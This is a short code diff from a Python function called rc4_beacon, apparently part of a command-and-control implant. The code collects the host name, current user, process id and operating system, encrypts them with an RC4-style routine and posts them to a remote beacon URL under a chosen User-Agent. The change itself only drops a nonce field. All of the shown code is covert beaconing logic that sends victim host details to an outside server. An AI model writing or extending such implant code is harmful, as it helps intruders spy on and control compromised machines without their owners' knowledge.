@@ -72,7 +72,7 @@ def rc4_beacon(key):
         current_user = getpass.getuser()
         process_id = os.getpid()
 
-        params = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system, "nonce": "1"}
+        params = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system}
         request = urllib2.Request(beacon_url, data = crypt(key, json.dumps(params)))
         request.add_header("User-Agent", user_agent)
         request.add_header("Content-Type", "application/json")
